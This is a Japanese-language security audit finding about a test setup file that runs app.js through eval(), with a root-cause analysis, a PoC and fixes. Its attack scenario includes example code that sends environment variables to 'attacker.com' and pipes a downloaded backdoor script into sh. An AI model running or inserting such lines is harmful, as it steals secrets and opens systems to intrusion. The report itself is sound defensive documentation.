# 🟠 コードインジェクション - eval()の使用によるRCEリスク

## メタデータ
```yaml
id: vuln-007
version: v1
iteration: 2
language: javascript
category: code-injection
cwe_id: CWE-95
cvss_score: 7.3
severity: High
priority: P1
discovered: 2025-11-21 00:00
status: New
related_vulns: [vuln-001]
```

## 🎯 要約
テストセットアップファイルで`eval()`を使用してapp.jsの内容を実行しており、コードインジェクションやRCE（Remote Code Execution）のリスクがあります。

## 📍 発生場所
- **ファイル**: `tests/setup.js`
- **行番号**: L120
- **関数**: テストセットアップ（グローバルスコープ）
- **エンドポイント**: なし（テスト実行時）

## 💣 詳細

### 問題コード
```javascript
// Read app.js and extract only function definitions (avoid executing event listeners)
const appJsPath = path.join(__dirname, '..', 'app.js');
const appJsContent = fs.readFileSync(appJsPath, 'utf8');

// Mock DOM elements to prevent errors during app.js execution
const mockElement = {
    addEventListener: () => {},
    // ...
};

const originalGetElementById = global.document?.getElementById;
if (typeof document !== 'undefined') {
    // Mock getElementById to return a mock element for any ID
    document.getElementById = (id) => mockElement;

    try {
        // Execute app.js in global scope to make functions available
        eval(appJsContent);  // ⚠️ 危険！
    } catch (error) {
        // Ignore errors from event listener setup
        if (!error.message.includes('addEventListener')) {
            console.error('Error loading app.js:', error);
        }
    }

    // Restore original getElementById
    if (originalGetElementById) {
        document.getElementById = originalGetElementById;
    }
}
```

### 根本原因
- `eval(appJsContent)`で外部ファイル（app.js）の内容を直接実行
- `eval()`は任意のJavaScriptコードを実行できる最も危険な関数
- app.jsが改ざんされた場合、テスト実行時に攻撃者のコードが実行される
- サプライチェーン攻撃のリスク（依存パッケージの改ざん、開発環境への侵入など）

### 攻撃シナリオ

**シナリオ1: ファイル改ざん + テスト実行**
1. 攻撃者が何らかの方法でapp.jsを改ざん（例：開発者のマシンへの侵入、サプライチェーン攻撃、脆弱なCI/CD）
2. 改ざんされたapp.jsに悪意のあるコードを挿入：
   ```javascript
   // app.jsに挿入された悪意のあるコード
   const fs = require('fs');
   const os = require('os');

   // 環境変数を窃取
   const secrets = {
       env: process.env,
       hostname: os.hostname(),
       user: os.userInfo()
   };

   // 攻撃者のサーバーに送信
   fetch('https://attacker.com/exfil', {
       method: 'POST',
       body: JSON.stringify(secrets)
   });

   // または、バックドアを設置
   require('child_process').exec('curl https://attacker.com/backdoor.sh | sh');
   ```
3. 開発者またはCI/CDが`npm test`を実行
4. `tests/setup.js`が読み込まれ、`eval(appJsContent)`が実行される
5. 攻撃者のコードが実行され、環境変数、シークレット、ファイルシステムへのアクセスが可能になる

**シナリオ2: CI/CD環境での実行**
1. CI/CD環境でテストが自動実行される
2. 攻撃者が改ざんしたapp.jsが含まれるPRをマージ
3. テスト実行時に`GEMINI_API_KEY`などの環境変数が窃取される
4. 攻撃者がAPIキーを悪用

### 影響範囲
- **機密性**: High（環境変数、ファイルシステムへのアクセス）
- **完全性**: High（任意のコード実行、ファイル改ざん）
- **可用性**: High（システムの破壊、DoS）
- **影響ユーザー**: 開発者、CI/CD環境、本番環境（テストファイルがデプロイされた場合）

## 🔗 関連脆弱性
- vuln-001: ディレクトリトラバーサル（組み合わせると、攻撃者がapp.jsの内容を確認し、悪意のあるコードを挿入する計画を立てられる）

## 🔬 検証手順 (PoC)

### 前提条件
- テスト環境でnpmまたはjestが実行可能
- app.jsが改ざん可能

### 再現ステップ
```bash
# 1. app.jsの末尾に悪意のあるコードを追加（デモ用）
echo "console.log('EXPLOITED: ', process.env.GEMINI_API_KEY);" >> app.js

# 2. テストを実行
npm test

# 3. コンソール出力に環境変数が表示されることを確認
# 出力例: EXPLOITED: your_actual_api_key_here

# 4. app.jsを元に戻す
git checkout app.js
```

## 🛡️ 推奨対策

### 短期
- [ ] `eval()`の使用を完全に削除
- [ ] CommonJS `require()`を使用してモジュールをインポート
- [ ] 以下のように修正：
  ```javascript
  // ❌ Before
  const appJsContent = fs.readFileSync(appJsPath, 'utf8');
  eval(appJsContent);

  // ✅ After
  // app.jsから必要な関数をエクスポートし、requireで読み込む
  const {
      parseTextToCards,
      loadCards,
      saveCards,
      createCard,
      deleteCard,
      escapeHtml,
      sanitizeInput,
      performOCR
  } = require('../app');

  // app.jsの末尾（module.exportsの部分）に追加が必要：
  // if (typeof module !== 'undefined' && module.exports) {
  //     module.exports = {
  //         parseTextToCards,
  //         loadCards,
  //         saveCards,
  //         createCard,
  //         deleteCard,
  //         escapeHtml,
  //         sanitizeInput,
  //         performOCR
  //     };
  // }
  ```

### 長期
- [ ] ESLintルールで`eval()`の使用を禁止
  ```json
  {
    "rules": {
      "no-eval": "error",
      "no-implied-eval": "error"
    }
  }
  ```
- [ ] テストファイルをプロダクションビルドから除外（既に除外されているか確認）
- [ ] `.gitignore`、`.npmignore`でテストファイルを除外
- [ ] ファイル整合性チェック（SRI、コードサイニング）をCI/CDに統合
- [ ] 定期的な依存パッケージの監査（`npm audit`）
- [ ] コードレビューガイドラインに「eval()使用禁止」を明記

## 🔗 参考
- OWASP: https://owasp.org/www-community/attacks/Code_Injection
- CWE: https://cwe.mitre.org/data/definitions/95.html
- ESLint no-eval: https://eslint.org/docs/latest/rules/no-eval
- MDN eval() considered harmful: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

---
*Iteration 2 | 2025-11-21 00:00 JST*
